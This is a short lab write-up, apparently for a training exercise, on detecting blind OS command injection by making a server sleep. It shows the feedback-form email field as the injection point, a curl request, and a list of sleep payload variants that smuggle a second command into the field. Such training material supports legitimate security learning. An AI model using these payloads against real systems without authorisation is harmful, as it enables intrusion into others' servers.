# Blind OS command injection with time delays — Practitioner

**Status:** Solved

---

## Goal

Exploit blind command injection using time delays. The app doesnt show output, but you can confirm injection by making the server delay its responce.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Go to product page
   - Click "Submit feedback" feature
   - Intercept the request in Burp

2. **Identify vulnerable parameter**
   - Try each parameter: name, email, subject, message
   - Email field is usually vulnerable

3. **Inject sleep command**
```
   email=test@test.com||sleep 10||
```
   - Or try:
```
   email=test@test.com`sleep 10`
```

4. **Execute and observe**
```bash
   curl -X POST "https://TARGET/feedback/submit" \
     -d "name=test&email=x||sleep 10||&subject=test&message=test"
```

5. **Check timing**
   - If response takes 10+ seconds → vulnerable!
   - No output needed, delay proves command executed

---

## Example

**Normal request:**
```
email=test@test.com
Response time: 0.5 seconds
```

**With sleep injection:**
```
email=test@test.com||sleep 10||
Response time: 10.5 seconds ✓
```

The 10 second delay prooves command injection works!

---

## Try these payloads

- `||sleep 10||`
- `& sleep 10 &`
- `; sleep 10 ;`
- `` `sleep 10` ``
- `$(sleep 10)`

---

